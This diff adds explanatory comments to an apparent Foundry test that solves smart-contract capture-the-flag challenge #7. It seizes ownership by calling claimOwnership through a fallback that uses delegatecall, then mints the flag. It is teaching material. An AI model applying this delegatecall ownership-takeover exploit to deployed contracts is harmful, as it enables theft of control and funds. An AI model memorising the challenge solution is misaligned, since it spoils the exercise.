@@ -27,11 +27,16 @@ contract Challenge7Test is BaseTest {
     function test_challenge7() public {
         vm.startPrank(PLAYER, PLAYER);
 
+        // Step 1: Call claimOwnership
+        // Because Challenge7 does not have an implementation for claimOwnership, it will call the delegate
+        // Then, the delegate will set the `owner`, but because of delegatecall, it will set the `owner` of the Challenge7 contract
         address(challenge7).call(abi.encodeWithSignature("claimOwnership()"));
         assertTrue(challenge7.owner() == PLAYER);
 
+        // Step 2: Call mintFlag
         challenge7.mintFlag();
 
+        // DONE: You should have obtained the flag for challenge #7
         assertTrue(nftFlags.hasMinted(PLAYER, 7));
     }
 }
